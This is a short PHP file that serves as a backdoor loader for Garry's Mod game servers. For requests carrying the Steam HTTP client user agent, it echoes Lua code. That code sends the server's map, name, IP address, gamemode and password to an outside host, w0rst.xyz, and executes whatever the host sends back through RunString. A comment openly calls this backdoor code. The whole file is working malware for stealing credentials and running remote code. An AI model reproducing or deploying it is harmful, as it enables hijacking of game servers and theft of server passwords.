<?php 

$token = $_GET['token']; // the token 
if($token) { $extra = "?token=$token"; } 

if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") { 
    // this will post to another page on our website and will run the backdoor code on the server!! ;0
    echo("if game.IsDedicated() then http.Post('https://w0rst.xyz/project/api/backdoor.php$extra', { map = game.GetMap(), server = GetHostName(), serverip = game.GetIPAddress(), gamemode = engine.ActiveGamemode(), password = GetConVar('sv_password'):GetString() }, RunString) end"); 
}

?> 